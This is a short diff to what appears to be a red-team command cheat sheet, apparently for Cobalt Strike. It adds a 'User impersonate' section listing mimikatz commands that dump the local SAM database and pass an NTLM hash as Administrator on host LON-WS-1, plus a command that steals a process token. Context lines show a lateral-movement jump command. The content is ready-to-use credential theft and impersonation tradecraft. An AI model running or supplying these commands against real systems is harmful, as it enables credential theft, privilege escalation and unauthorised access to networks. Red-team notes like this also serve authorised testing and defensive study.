@@ -86,6 +86,17 @@ jump scshell64 lon-ws-1 smb
 ```
 
 ---
+# User impersonate
+
+```
+mimikatz !lsadump::sam
+
+mimikatz sekurlsa::pth /user:Administrator /domain:LON-WS-1 /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:%COMSPEC%
+
+steal_token 1088
+```
+
+---
 # ShareWrite
 
 ```
